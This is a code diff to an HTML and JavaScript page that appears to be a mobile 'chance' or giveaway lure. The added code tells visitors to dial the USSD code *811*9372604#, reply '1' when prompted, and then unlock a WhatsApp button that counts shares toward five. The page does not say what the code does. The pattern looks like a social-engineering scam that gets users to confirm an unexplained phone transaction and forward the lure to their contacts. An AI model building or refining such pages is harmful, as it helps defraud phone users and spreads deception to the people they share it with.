@@ -27,11 +27,28 @@
 
     <div class="card step">
 
-        <h3>1. Dial *811*9372604#</h3>
+    <h3>Step 1 of 3: Activate Your Chance</h3>
 
-        <button onclick="dialNow()">
-            📞 Dial Now
-        </button>
+    <p>
+        Dial the code below using your phone dialer.
+        When prompted, reply with <strong>1</strong> to continue.
+    </p>
+
+    <h2>*811*9372604#</h2>
+
+    <button onclick="dialNow()">
+        📞 Dial Code Now
+    </button>
+<p id="dialStatus" style="margin-top:15px;color:#555;">
+    After completing the USSD step, return here and tap continue.
+</p>
+
+<button id="continueBtn" onclick="completeDial()" style="margin-top:15px;">
+    Continue
+</button>
+    
+
+</div>
 
     </div>
 
@@ -41,9 +58,9 @@
 
         <p id="shareCount">Shares: 0/5</p>
 
-        <button onclick="shareWhatsApp()">
-            🔗 Share Now
-        </button>
+        <button id="shareBtn" onclick="shareWhatsApp()" disabled>
+    🔗 Share Now
+</button>
 
     </div>
 
@@ -66,9 +83,25 @@
 let shares = 0;
 
 function dialNow() {
-    window.location.href = "tel:*811*9372604#";
-} 
 
+    document.getElementById("dialStatus").innerHTML =
+    "Dialing started. Complete the USSD instructions, reply with 1, then return here to continue.";
+
+    window.location.href = "tel:*811*9372604%23";
+
+}
+function completeDial() {
+
+    localStorage.setItem("dialCompleted", "true");
+
+    document.getElementById("shareBtn").disabled = false;
+
+    document.getElementById("dialStatus").innerHTML =
+    "Step completed. You can now continue to Share.";
+
+    document.getElementById("continueBtn").style.display = "none";
+
+}
 
 function shareWhatsApp() {
 
